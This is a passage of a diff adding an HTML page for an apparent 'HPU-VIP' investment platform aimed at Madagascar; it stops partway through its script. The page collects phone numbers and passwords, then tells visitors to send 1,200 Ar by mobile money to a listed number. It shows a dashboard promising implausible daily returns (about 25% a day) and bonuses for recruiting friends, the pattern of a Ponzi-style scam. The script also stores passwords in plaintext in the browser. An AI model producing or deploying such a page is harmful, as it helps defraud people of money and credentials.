@@ -1,0 +1,771 @@
+<!DOCTYPE html>
+<html lang="mg" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VIP Investment Platform MG</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        neonCyan: '#00f3ff',
+                        neonMagenta: '#ff007f',
+                        neonGold: '#ffd700',
+                        neonGreen: '#00ff88',
+                        darkBg: '#0b0f19',
+                        darkCard: '#131b2e',
+                    },
+                    animation: {
+                        'pulse-glow': 'pulseGlow 3s infinite alternate',
+                        'spin-slow': 'spin 12s linear infinite',
+                        'float': 'float 4s ease-in-out infinite',
+                    },
+                    keyframes: {
+                        pulseGlow: {
+                            '0%': { boxShadow: '0 0 15px rgba(0, 243, 255, 0.3)' },
+                            '100%': { boxShadow: '0 0 30px rgba(255, 0, 127, 0.6)' },
+                        },
+                        float: {
+                            '0%, 100%': { transform: 'translateY(0px)' },
+                            '50%': { transform: 'translateY(-10px)' },
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <!-- FontAwesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts Inter & Orbitron -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&family=Orbitron:wght@600;800;900&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #070a12;
+            color: #f3f4f6;
+            overflow-x: hidden;
+        }
+        .font-tech {
+            font-family: 'Orbitron', sans-serif;
+        }
+        .neon-border-cyan {
+            box-shadow: 0 0 15px rgba(0, 243, 255, 0.3);
+            border: 1px solid rgba(0, 243, 255, 0.5);
+        }
+        .neon-border-magenta {
+            box-shadow: 0 0 15px rgba(255, 0, 127, 0.3);
+            border: 1px solid rgba(255, 0, 127, 0.5);
+        }
+        .neon-border-gold {
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.3);
+            border: 1px solid rgba(255, 215, 0, 0.5);
+        }
+        .neon-border-green {
+            box-shadow: 0 0 15px rgba(0, 255, 136, 0.3);
+            border: 1px solid rgba(0, 255, 136, 0.5);
+        }
+        .glass-panel {
+            background: rgba(19, 27, 46, 0.75);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+        }
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0b0f19;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #1e293b;
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #00f3ff;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col justify-between relative selection:bg-neonMagenta selection:text-white">
+
+    <!-- Background Animated Neon Orbs -->
+    <div class="fixed top-[-10%] left-[-10%] w-[450px] h-[450px] bg-neonCyan/15 rounded-full blur-[120px] pointer-events-none animate-pulse-glow"></div>
+    <div class="fixed bottom-[-10%] right-[-10%] w-[500px] h-[500px] bg-neonMagenta/15 rounded-full blur-[140px] pointer-events-none animate-pulse-glow"></div>
+    <div class="fixed top-[40%] right-[25%] w-[300px] h-[300px] bg-neonGold/10 rounded-full blur-[100px] pointer-events-none"></div>
+
+    <!-- Header / Navbar -->
+    <header class="sticky top-0 z-50 glass-panel border-b border-slate-800/80 px-4 py-3">
+        <div class="max-w-6xl mx-auto flex justify-between items-center">
+            <div class="flex items-center gap-3 cursor-pointer" onclick="switchStep('step-register')">
+                <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-neonCyan via-neonMagenta to-neonGold p-[2px] animate-spin-slow">
+                    <div class="w-full h-full bg-darkBg rounded-[10px] flex items-center justify-center">
+                        <i class="fa-solid fa-gem text-neonCyan text-lg"></i>
+                    </div>
+                </div>
+                <div>
+                    <h1 class="font-tech font-extrabold text-lg bg-gradient-to-r from-neonCyan via-neonMagenta to-neonGold bg-clip-text text-transparent">
+                        HPU-VIP <span class="text-xs font-sans px-1.5 py-0.5 rounded bg-neonMagenta/20 text-neonMagenta border border-neonMagenta/40">PRO</span>
+                    </h1>
+                    <p class="text-[10px] text-slate-400 tracking-wider">PLATAFORMA INVESTISSEMENT MG</p>
+                </div>
+            </div>
+
+            <!-- Status Indicator / Step tracker -->
+            <div id="nav-step-tracker" class="hidden md:flex items-center gap-2 bg-slate-900/80 px-3 py-1.5 rounded-full border border-slate-800 text-xs">
+                <span id="badge-step1" class="px-2.5 py-1 rounded-full bg-neonCyan/20 text-neonCyan font-semibold border border-neonCyan/40">1. Inscription</span>
+                <i class="fa-solid fa-chevron-right text-slate-600 text-[10px]"></i>
+                <span id="badge-step2" class="px-2.5 py-1 rounded-full text-slate-500 font-semibold">2. Fandoavam-bola</span>
+                <i class="fa-solid fa-chevron-right text-slate-600 text-[10px]"></i>
+                <span id="badge-step3" class="px-2.5 py-1 rounded-full text-slate-500 font-semibold">3. Dashboard VIP</span>
+            </div>
+
+            <!-- User Quick Actions -->
+            <div class="flex items-center gap-2">
+                <button onclick="toggleSound()" id="sound-btn" class="w-9 h-9 rounded-lg bg-slate-800/80 hover:bg-slate-700 text-slate-300 flex items-center justify-center transition border border-slate-700" title="Feo">
+                    <i class="fa-solid fa-volume-high text-xs"></i>
+                </button>
+                <div id="user-pill" class="hidden flex items-center gap-2 bg-neonGreen/10 border border-neonGreen/30 px-3 py-1 rounded-lg">
+                    <span class="w-2 h-2 rounded-full bg-neonGreen animate-ping"></span>
+                    <span id="user-display-phone" class="text-xs font-mono text-neonGreen font-semibold">034...</span>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Container -->
+    <main class="max-w-5xl mx-auto w-full px-4 py-6 flex-grow flex flex-col justify-center relative z-10">
+
+        <!-- Notification Toast -->
+        <div id="toast-container" class="fixed top-16 right-4 z-50 flex flex-col gap-2 max-w-sm w-full pointer-events-none"></div>
+
+        <!-- STEP 1: REGISTRATION / INSCRIPTION -->
+        <section id="step-register" class="w-full max-w-md mx-auto transition-all duration-500 transform">
+            <div class="glass-panel p-6 sm:p-8 rounded-2xl border border-neonCyan/40 shadow-[0_0_25px_rgba(0,243,255,0.15)] relative overflow-hidden">
+                <div class="absolute -top-12 -right-12 w-32 h-32 bg-neonCyan/20 rounded-full blur-2xl"></div>
+                
+                <div class="text-center mb-6">
+                    <div class="inline-flex items-center justify-center w-14 h-14 rounded-2xl bg-neonCyan/10 text-neonCyan border border-neonCyan/30 mb-3 animate-float">
+                        <i class="fa-solid fa-user-plus text-2xl"></i>
+                    </div>
+                    <h2 class="text-2xl font-bold font-tech text-white tracking-wide">Fisoratana Anarana</h2>
+                    <p class="text-slate-400 text-xs mt-1">Ampidiro ny laharana findainao mba hanombohana amin'ny HPU VIP</p>
+                </div>
+
+                <form onsubmit="handleRegister(event)" class="space-y-4">
+                    <div>
+                        <label class="block text-xs font-semibold text-slate-300 mb-1.5">Laharana Finday (Mobile Money)</label>
+                        <div class="relative">
+                            <span class="absolute inset-y-0 left-0 flex items-center pl-3.5 text-slate-500">
+                                <i class="fa-solid fa-phone text-sm"></i>
+                            </span>
+                            <input type="tel" id="reg-phone" required placeholder="Ohatra: 034 12 345 67" 
+                                class="w-full pl-10 pr-4 py-3 bg-slate-900/90 border border-slate-700/80 rounded-xl text-white placeholder-slate-500 text-sm focus:outline-none focus:border-neonCyan focus:ring-1 focus:ring-neonCyan transition">
+                        </div>
+                        <p class="text-[10px] text-slate-500 mt-1">Mvola, Orange Money, na Airtel Money</p>
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-semibold text-slate-300 mb-1.5">Teny Miafina (Mot de passe)</label>
+                        <div class="relative">
+                            <span class="absolute inset-y-0 left-0 flex items-center pl-3.5 text-slate-500">
+                                <i class="fa-solid fa-lock text-sm"></i>
+                            </span>
+                            <input type="password" id="reg-pass" required placeholder="••••••••" 
+                                class="w-full pl-10 pr-10 py-3 bg-slate-900/90 border border-slate-700/80 rounded-xl text-white placeholder-slate-500 text-sm focus:outline-none focus:border-neonCyan focus:ring-1 focus:ring-neonCyan transition">
+                            <button type="button" onclick="togglePassVisibility('reg-pass', 'pass-icon')" class="absolute inset-y-0 right-0 flex items-center pr-3.5 text-slate-500 hover:text-slate-300">
+                                <i id="pass-icon" class="fa-solid fa-eye text-sm"></i>
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="pt-2">
+                        <button type="submit" 
+                            class="w-full py-3.5 px-4 bg-gradient-to-r from-neonCyan via-blue-600 to-indigo-600 hover:from-cyan-400 hover:to-indigo-500 text-slate-950 font-bold rounded-xl shadow-lg shadow-neonCyan/20 transition transform active:scale-95 font-tech text-sm tracking-wider flex items-center justify-center gap-2">
+                            <span>MANDRAY ANARANA (INSCRIPTION)</span>
+                            <i class="fa-solid fa-arrow-right"></i>
+                        </button>
+                    </div>
+                </form>
+
+                <div class="mt-6 pt-4 border-t border-slate-800 text-center">
+                    <p class="text-xs text-slate-400">
+                        Efa manana kaonty? <a href="#" onclick="showNotification('Azo ampiasaina mivantana ny laharanao hidirana!', 'info')" class="text-neonCyan font-semibold hover:underline">Midira eto</a>
+                    </p>
+                </div>
+            </div>
+        </section>
+
+        <!-- STEP 2: INVESTMENT PAYMENT & REFERENCE CHECK -->
+        <section id="step-payment" class="w-full max-w-lg mx-auto hidden transition-all duration-500 transform">
+            <div class="glass-panel p-6 sm:p-8 rounded-2xl border border-neonMagenta/50 shadow-[0_0_25px_rgba(255,0,127,0.2)] relative overflow-hidden">
+                <div class="absolute -top-12 -left-12 w-32 h-32 bg-neonMagenta/20 rounded-full blur-2xl"></div>
+
+                <div class="text-center mb-6">
+                    <span class="inline-block px-3 py-1 rounded-full bg-neonMagenta/20 text-neonMagenta text-xs font-semibold border border-neonMagenta/30 mb-2">Dingana 2 / 3</span>
+                    <h2 class="text-2xl font-bold font-tech text-white">Fanaovana Investissement</h2>
+                    <p class="text-slate-300 text-xs mt-1">Mila manao fampiasam-bola kely ianao mba hampavitrika (activer) ny VIP-nao.</p>
+                </div>
+
+                <!-- Payment Details Card -->
+                <div class="bg-slate-900/90 rounded-xl p-4 border border-slate-800 mb-6 space-y-3">
+                    <div class="flex justify-between items-center pb-2 border-b border-slate-800">
+                        <span class="text-xs text-slate-400">Vola aloa (Investissement Initial):</span>
+                        <span class="font-tech text-lg font-extrabold text-neonGold animate-pulse">1 200 Ar</span>
+                    </div>
+
+                    <div class="bg-neonMagenta/10 border border-neonMagenta/30 rounded-lg p-3 text-center">
+                        <p class="text-xs text-slate-300 mb-1">Alefaso amin'ity laharana Mobile Money ity ny vola:</p>
+                        <div class="flex items-center justify-center gap-2">
+                            <span class="font-tech text-xl font-black text-neonMagenta tracking-wider" id="target-phone">038 55 388 89</span>
+                            <button onclick="copyToClipboard('0385538889')" class="p-1.5 bg-neonMagenta/20 hover:bg-neonMagenta/30 text-neonMagenta rounded-md transition text-xs" title="Kopiavo">
+                                <i class="fa-solid fa-copy"></i>
+                            </button>
+                        </div>
+                        <span class="text-[10px] text-slate-400 block mt-1">(Mvola / Orange Money / Airtel Money)</span>
+                    </div>
+                </div>
+
+                <!-- Reference Form -->
+                <form onsubmit="handlePaymentSubmit(event)" class="space-y-4">
+                    <div>
+                        <label class="block text-xs font-semibold text-slate-300 mb-1.5">Référence SMS / ID Transaction</label>
+                        <div class="relative">
+                            <span class="absolute inset-y-0 left-0 flex items-center pl-3.5 text-slate-500">
+                                <i class="fa-solid fa-receipt text-sm"></i>
+                            </span>
+                            <input type="text" id="ref-input" required placeholder="Ohatra: 1234567890 na Ref: TXN..." 
+                                class="w-full pl-10 pr-4 py-3 bg-slate-900/90 border border-slate-700/80 rounded-xl text-white placeholder-slate-500 text-sm focus:outline-none focus:border-neonMagenta focus:ring-1 focus:ring-neonMagenta font-mono transition">
+                        </div>
+                        <p class="text-[10px] text-slate-400 mt-1">
+                            <i class="fa-solid fa-circle-info text-neonCyan mr-1"></i>
+                            Ampidiro eto ny laharana reference voarainao amin'ny SMS rehefa avy nandefa ny 1 200 Ar.
+                        </p>
+                    </div>
+
+                    <div class="flex gap-3 pt-2">
+                        <button type="button" onclick="switchStep('step-register')" 
+                            class="w-1/3 py-3 px-3 bg-slate-800 hover:bg-slate-700 text-slate-300 font-semibold rounded-xl text-xs transition">
+                            Hiverina
+                        </button>
+                        <button type="submit" id="btn-verify-ref"
+                            class="w-2/3 py-3 px-4 bg-gradient-to-r from-neonMagenta via-purple-600 to-pink-600 hover:from-pink-500 hover:to-purple-500 text-white font-bold rounded-xl shadow-lg shadow-neonMagenta/20 transition transform active:scale-95 font-tech text-xs tracking-wider flex items-center justify-center gap-2">
+                            <i class="fa-solid fa-shield-halved"></i>
+                            <span>HANAMARINA ARY HIDITRA</span>
+                        </button>
+                    </div>
+                </form>
+            </div>
+        </section>
+
+        <!-- STEP 3: DASHBOARD VIP -->
+        <section id="step-dashboard" class="w-full hidden space-y-6 transition-all duration-500 transform">
+            
+            <!-- Top Banner Welcome -->
+            <div class="glass-panel p-5 sm:p-6 rounded-2xl border border-neonGreen/40 shadow-[0_0_30px_rgba(0,255,136,0.15)] flex flex-col md:flex-row justify-between items-center gap-4 relative overflow-hidden">
+                <div class="absolute top-0 right-0 w-64 h-64 bg-neonGreen/10 rounded-full blur-3xl pointer-events-none"></div>
+                
+                <div class="flex items-center gap-4">
+                    <div class="w-14 h-14 rounded-2xl bg-neonGreen/20 border border-neonGreen/50 flex items-center justify-center text-neonGreen text-2xl font-tech">
+                        VIP1
+                    </div>
+                    <div>
+                        <div class="flex items-center gap-2">
+                            <h2 class="text-xl font-bold font-tech text-white">Tonga lafatra! Dashboard VIP</h2>
+                            <span class="px-2 py-0.5 rounded text-[10px] bg-neonGreen/20 text-neonGreen font-bold border border-neonGreen/40">AMPAVITRIHINA</span>
+                        </div>
+                        <p class="text-slate-400 text-xs mt-0.5">Kaonty: <span id="dash-user-phone" class="font-mono text-slate-200">034...</span> | Reference: <span id="dash-user-ref" class="font-mono text-neonGold">TXN-88902</span></p>
+                    </div>
+                </div>
+
+                <div class="flex items-center gap-2 w-full md:w-auto">
+                    <button onclick="claimDailyBonus()" id="btn-claim" class="w-full md:w-auto py-2.5 px-5 bg-gradient-to-r from-neonGreen via-emerald-500 to-teal-600 hover:from-emerald-400 hover:to-teal-400 text-slate-950 font-extrabold rounded-xl text-xs font-tech tracking-wider shadow-lg shadow-neonGreen/20 transition transform active:scale-95 flex items-center justify-center gap-2">
+                        <i class="fa-solid fa-gift text-sm"></i>
+                        <span>ONDRANA BENUS MDIANA (+300 Ar)</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Stats Grid -->
+            <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
+                <!-- Stat 1 -->
+                <div class="glass-panel p-4 rounded-xl border border-neonCyan/30 relative">
+                    <div class="flex justify-between items-start">
+                        <span class="text-xs text-slate-400 font-semibold">Tontalim-potoana Tombony</span>
+                        <span class="p-2 rounded-lg bg-neonCyan/10 text-neonCyan"><i class="fa-solid fa-wallet"></i></span>
+                    </div>
+                    <div class="mt-2">
+                        <span id="stat-balance" class="font-tech text-2xl font-black text-neonCyan">1 200</span>
+                        <span class="text-xs text-slate-400 ml-1">Ar</span>
+                    </div>
+                    <p class="text-[10px] text-neonGreen mt-1"><i class="fa-solid fa-arrow-trend-up mr-1"></i>+300 Ar androany</p>
+                </div>
+
+                <!-- Stat 2 -->
+                <div class="glass-panel p-4 rounded-xl border border-neonGold/30 relative">
+                    <div class="flex justify-between items-start">
+                        <span class="text-xs text-slate-400 font-semibold">Tombony Isan'andro</span>
+                        <span class="p-2 rounded-lg bg-neonGold/10 text-neonGold"><i class="fa-solid fa-coins"></i></span>
+                    </div>
+                    <div class="mt-2">
+                        <span class="font-tech text-2xl font-black text-neonGold">300</span>
+                        <span class="text-xs text-slate-400 ml-1">Ar / andro</span>
+                    </div>
+                    <p class="text-[10px] text-slate-400 mt-1">Ho an'ny paket VIP 1</p>
+                </div>
+
+                <!-- Stat 3 -->
+                <div class="glass-panel p-4 rounded-xl border border-neonMagenta/30 relative">
+                    <div class="flex justify-between items-start">
+                        <span class="text-xs text-slate-400 font-semibold">Olona Nanasana (Parrainage)</span>
+                        <span class="p-2 rounded-lg bg-neonMagenta/10 text-neonMagenta"><i class="fa-solid fa-users"></i></span>
+                    </div>
+                    <div class="mt-2">
+                        <span id="stat-referrals" class="font-tech text-2xl font-black text-neonMagenta">0</span>
+                        <span class="text-xs text-slate-400 ml-1">olona</span>
+                    </div>
+                    <p class="text-[10px] text-slate-400 mt-1">Bonus: +500 Ar / olona</p>
+                </div>
+
+                <!-- Stat 4 -->
+                <div class="glass-panel p-4 rounded-xl border border-purple-500/30 relative">
+                    <div class="flex justify-between items-start">
+                        <span class="text-xs text-slate-400 font-semibold">Status ny Kaonty</span>
+                        <span class="p-2 rounded-lg bg-purple-500/10 text-purple-400"><i class="fa-solid fa-circle-check"></i></span>
+                    </div>
+                    <div class="mt-2">
+                        <span class="font-tech text-lg font-black text-purple-300">VIP LEVALA 1</span>
+                    </div>
+                    <p class="text-[10px] text-neonGreen mt-1">Azo alaina ny vola (Retrait OK)</p>
+                </div>
+            </div>
+
+            <!-- VIP Packages Selection -->
+            <div class="space-y-3">
+                <h3 class="text-lg font-bold font-tech text-white flex items-center gap-2">
+                    <i class="fa-solid fa-layer-group text-neonCyan"></i>
+                    <span>Safidy Paket VIP Hafa</span>
+                </h3>
+
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                    <!-- VIP 1 Card -->
+                    <div class="glass-panel rounded-xl p-5 border border-neonCyan/40 relative flex flex-col justify-between hover:border-neonCyan transition">
+                        <div class="absolute top-3 right-3">
+                            <span class="px-2 py-0.5 rounded text-[10px] bg-neonCyan/20 text-neonCyan border border-neonCyan/40 font-bold">MAMPIASA NY</span>
+                        </div>
+                        <div>
+                            <div class="text-xs text-slate-400 font-semibold uppercase">Paket Fototra</div>
+                            <h4 class="text-xl font-bold font-tech text-white mt-1">VIP LEVEL 1</h4>
+                            <div class="my-3 text-2xl font-black font-tech text-neonCyan">1 200 <span class="text-xs font-normal text-slate-400">Ar</span></div>
+                            <ul class="text-xs space-y-2 text-slate-300 mb-4">
+                                <li class="flex items-center gap-2"><i class="fa-solid fa-check text-neonCyan text-[10px]"></i> Tombony: 300 Ar / andro</li>
+                                <li class="flex items-center gap-2"><i class="fa-solid fa-check text-neonCyan text-[10px]"></i> Faharetany: 30 Andro</li>
+                                <li class="flex items-center gap-2"><i class="fa-solid fa-check text-neonCyan text-[10px]"></i> Tontaly fitambarany: 9 000 Ar</li>
+                            </ul>
+                        </div>
+                        <button class="w-full py-2 bg-slate-800 text-slate-400 text-xs font-bold rounded-lg cursor-default">
+                            EFA MANTANJAKA (ACTIF)
+                        </button>
+                    </div>
+
+                    <!-- VIP 2 Card -->
+                    <div class="glass-panel rounded-xl p-5 border border-neonGold/40 relative flex flex-col justify-between hover:border-neonGold transition">
+                        <div class="absolute top-3 right-3">
+                            <span class="px-2 py-0.5 rounded text-[10px] bg-neonGold/20 text-neonGold border border-neonGold/40 font-bold">POPULAIRE</span>
+                        </div>
+                        <div>
+                            <div class="text-xs text-slate-400 font-semibold uppercase">Paket Antenatenany</div>
+                            <h4 class="text-xl font-bold font-tech text-white mt-1">VIP LEVEL 2</h4>
+                            <div class="my-3 text-2xl font-black font-tech text-neonGold">5 000 <span class="text-xs font-normal text-slate-400">Ar</span></div>
+                            <ul class="text-xs space-y-2 text-slate-300 mb-4">
+                                <li class="flex items-center gap-2"><i class="fa-solid fa-check text-neonGold text-[10px]"></i> Tombony: 1 500 Ar / andro</li>
+                                <li class="flex items-center gap-2"><i class="fa-solid fa-check text-neonGold text-[10px]"></i> Faharetany: 30 Andro</li>
+                                <li class="flex items-center gap-2"><i class="fa-solid fa-check text-neonGold text-[10px]"></i> Tontaly fitambarany: 45 000 Ar</li>
+                            </ul>
+                        </div>
+                        <button onclick="upgradeVIP('VIP Level 2', '5 000 Ar')" class="w-full py-2.5 bg-gradient-to-r from-neonGold to-amber-500 hover:from-yellow-400 hover:to-amber-400 text-slate-950 text-xs font-bold font-tech rounded-lg transition transform active:scale-95 shadow-md shadow-neonGold/20">
+                            HO AMIN'NY VIP 2
+                        </button>
+                    </div>
+
+                    <!-- VIP 3 Card -->
+                    <div class="glass-panel rounded-xl p-5 border border-neonMagenta/40 relative flex flex-col justify-between hover:border-neonMagenta transition">
+                        <div class="absolute top-3 right-3">
+                            <span class="px-2 py-0.5 rounded text-[10px] bg-neonMagenta/20 text-neonMagenta border border-neonMagenta/40 font-bold">PROFIT MAX</span>
+                        </div>
+                        <div>
+                            <div class="text-xs text-slate-400 font-semibold uppercase">Paket Avo Lenta</div>
+                            <h4 class="text-xl font-bold font-tech text-white mt-1">VIP LEVEL 3</h4>
+                            <div class="my-3 text-2xl font-black font-tech text-neonMagenta">15 000 <span class="text-xs font-normal text-slate-400">Ar</span></div>
+                            <ul class="text-xs space-y-2 text-slate-300 mb-4">
+                                <li class="flex items-center gap-2"><i class="fa-solid fa-check text-neonMagenta text-[10px]"></i> Tombony: 5 000 Ar / andro</li>
+                                <li class="flex items-center gap-2"><i class="fa-solid fa-check text-neonMagenta text-[10px]"></i> Faharetany: 30 Andro</li>
+                                <li class="flex items-center gap-2"><i class="fa-solid fa-check text-neonMagenta text-[10px]"></i> Tontaly fitambarany: 150 000 Ar</li>
+                            </ul>
+                        </div>
+                        <button onclick="upgradeVIP('VIP Level 3', '15 000 Ar')" class="w-full py-2.5 bg-gradient-to-r from-neonMagenta to-purple-600 hover:from-pink-500 hover:to-purple-500 text-white text-xs font-bold font-tech rounded-lg transition transform active:scale-95 shadow-md shadow-neonMagenta/20">
+                            HO AMIN'NY VIP 3
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Referral Link Generator Card -->
+            <div class="glass-panel p-5 rounded-2xl border border-slate-800 space-y-3">
+                <h3 class="text-md font-bold font-tech text-white flex items-center gap-2">
+                    <i class="fa-solid fa-share-nodes text-neonGreen"></i>
+                    <span>Rohy Fanasana Namana (Lien de Parrainage)</span>
+                </h3>
+                <p class="text-xs text-slate-400">Zarao amin'ny namanao ity rohy ity. Mahazo 500 Ar ianao amin'ny olona iray misoratra anarana sy mandefa fampiasam-bola.</p>
+                
+                <div class="flex gap-2">
+                    <input type="text" id="ref-link-input" readonly value="https://hpuvip01.github.io/ref?id=0341234567" 
+                        class="w-full bg-slate-900 border border-slate-700 rounded-xl px-3 py-2 text-xs text-slate-300 font-mono focus:outline-none">
+                    <button onclick="copyReferralLink()" class="px-4 py-2 bg-neonGreen/20 hover:bg-neonGreen/30 text-neonGreen border border-neonGreen/40 rounded-xl text-xs font-bold transition flex items-center gap-1.5 whitespace-nowrap">
+                        <i class="fa-solid fa-copy"></i>
+                        <span>Kopiavo</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Logout / Reset Simulation Button -->
+            <div class="text-center pt-4">
+                <button onclick="resetSimulation()" class="text-xs text-slate-500 hover:text-slate-300 underline transition">
+                    <i class="fa-solid fa-arrow-rotate-left mr-1"></i>Abohay indray ny simulation (Hiverina amin'ny voalohany)
+                </button>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- Modal Verification Status Simulation -->
+    <div id="status-modal" class="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4 hidden">
+        <div class="glass-panel max-w-sm w-full p-6 rounded-2xl border border-neonCyan/50 text-center space-y-4 shadow-[0_0_30px_rgba(0,243,255,0.3)] animate-float">
+            <div id="modal-spinner" class="w-16 h-16 border-4 border-neonCyan border-t-transparent rounded-full animate-spin mx-auto"></div>
+            <div id="modal-success-icon" class="w-16 h-16 bg-neonGreen/20 border border-neonGreen rounded-full flex items-center justify-center text-neonGreen text-2xl mx-auto hidden">
+                <i class="fa-solid fa-check"></i>
+            </div>
+            
+            <h3 id="modal-title" class="text-lg font-bold font-tech text-white">Eo am-panamarinana...</h3>
+            <p id="modal-desc" class="text-xs text-slate-300">Jerena ao amin'ny rafitra ny reference <span id="modal-ref-code" class="text-neonGold font-mono font-bold"></span>.</p>
+
+            <button id="modal-btn" onclick="closeModalAndProceed()" class="w-full py-2.5 bg-neonGreen hover:bg-emerald-400 text-slate-950 font-extrabold rounded-xl text-xs font-tech tracking-wider hidden transition">
+                DANY! HIDITRA AOHANATY DASHBOARD
+            </button>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="glass-panel border-t border-slate-800/80 py-4 px-4 text-center text-xs text-slate-500 relative z-10 mt-8">
+        <div class="max-w-6xl mx-auto flex flex-col sm:flex-row justify-between items-center gap-2">
+            <p>© 2026 HPU-VIP Platform. All rights reserved.</p>
+            <p class="text-[10px] text-slate-600">Fanamboarana Tranokala GitHub Pages Simulation</p>
+        </div>
+    </footer>
+
+    <!-- Audio Effects (Web Audio API Synthesizer) -->
+    <script>
+        // Sound FX using Web Audio API to avoid external asset dependency
+        let soundEnabled = true;
+        const AudioContext = window.AudioContext || window.webkitAudioContext;
+        let audioCtx = null;
+
+        function initAudio() {
+            if (!audioCtx) {
+                audioCtx = new AudioContext();
+            }
+        }
+
+        function playBeep(freq = 440, type = 'sine', duration = 0.15) {
+            if (!soundEnabled) return;
+            try {
+                initAudio();
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.type = type;
+                osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
+                gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + duration);
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.start();
+                osc.stop(audioCtx.currentTime + duration);
+            } catch(e) {
+                // Audio context blocked until interaction
+            }
+        }
+
+        function playSuccessSound() {
+            if (!soundEnabled) return;
+            setTimeout(() => playBeep(523.25, 'triangle', 0.1), 0); // C5
+            setTimeout(() => playBeep(659.25, 'triangle', 0.1), 100); // E5
+            setTimeout(() => playBeep(783.99, 'triangle', 0.25), 200); // G5
+        }
+
+        function toggleSound() {
+            soundEnabled = !soundEnabled;
+            const btn = document.getElementById('sound-btn');
+            btn.innerHTML = soundEnabled 
+                ? '<i class="fa-solid fa-volume-high text-xs text-neonCyan"></i>' 
+                : '<i class="fa-solid fa-volume-xmark text-xs text-slate-500"></i>';
+            showNotification(soundEnabled ? "Alefa ny feo" : "Nalaina ny feo", "info");
+        }
+    </script>
+
+    <!-- Main Logic Script -->
+    <script>
+        // Global App State
+        const state = {
+            registeredPhone: '',
+            password: '',
+            transactionRef: '',
+            balance: 1200,
+            claimedToday: false,
+            referralCount: 0
+        };
+
+        // DOM Ready
+        window.onload = function() {
+            // Check stored simulation state
+            const savedState = localStorage.getItem('hpu_vip_state');
+            if (savedState) {
+                try {
+                    const parsed = JSON.parse(savedState);
+                    Object.assign(state, parsed);
+                    if (state.transactionRef) {
+                        updateDashboardUI();
+                        switchStep('step-dashboard');
+                    }
+                } catch(e){}
+            }
+        };
+
+        function saveState() {
+            localStorage.setItem('hpu_vip_state', JSON.stringify(state));
+        }
+
+        // Navigation Controller
+        function switchStep(stepId) {
+            playBeep(600, 'sine', 0.08);
+
+            const steps = ['step-register', 'step-payment', 'step-dashboard'];
+            steps.forEach(s => {
+                const el = document.getElementById(s);
+                if (s === stepId) {
+                    el.classList.remove('hidden');
+                } else {
+                    el.classList.add('hidden');
+                }
+            });
+
+            // Update Trackers
+            const b1 = document.getElementById('badge-step1');
+            const b2 = document.getElementById('badge-step2');
+            const b3 = document.getElementById('badge-step3');
+
+            if (stepId === 'step-register') {
+                b1.className = "px-2.5 py-1 rounded-full bg-neonCyan/20 text-neonCyan font-semibold border border-neonCyan/40";
+                b2.className = "px-2.5 py-1 rounded-full text-slate-500 font-semibold";
+                b3.className = "px-2.5 py-1 rounded-full text-slate-500 font-semibold";
+            } else if (stepId === 'step-payment') {
+                b1.className = "px-2.5 py-1 rounded-full bg-slate-800 text-slate-400 font-semibold";
+                b2.className = "px-2.5 py-1 rounded-full bg-neonMagenta/20 text-neonMagenta font-semibold border border-neonMagenta/40";
+                b3.className = "px-2.5 py-1 rounded-full text-slate-500 font-semibold";
+            } else if (stepId === 'step-dashboard') {
+                b1.className = "px-2.5 py-1 rounded-full bg-slate-800 text-slate-400 font-semibold";
+                b2.className = "px-2.5 py-1 rounded-full bg-slate-800 text-slate-400 font-semibold";
+                b3.className = "px-2.5 py-1 rounded-full bg-neonGreen/20 text-neonGreen font-semibold border border-neonGreen/40";
+            }
+
+            document.getElementById('nav-step-tracker').classList.remove('hidden');
+        }
+
+        // Toggle Password Visibility
+        function togglePassVisibility(inputId, iconId) {
+            const input = document.getElementById(inputId);
+            const icon = document.getElementById(iconId);
+            if (input.type === "password") {
+                input.type = "text";
+                icon.className = "fa-solid fa-eye-slash text-sm";
+            } else {
+                input.type = "password";
+                icon.className = "fa-solid fa-eye text-sm";
+            }
+        }
+
+        // Step 1: Registration Handler
+        function handleRegister(e) {
+            e.preventDefault();
+            const phone = document.getElementById('reg-phone').value.trim();
+            const pass = document.getElementById('reg-pass').value.trim();
+
+            if (phone.length < 8) {
+                showNotification("Azafady ampidiro laharana finday manankery!", "error");
+                return;
+            }
+
+            state.registeredPhone = phone;
+            state.password = pass;
+            saveState();
+
+            // Show User Pill
+            document.getElementById('user-pill').classList.remove('hidden');
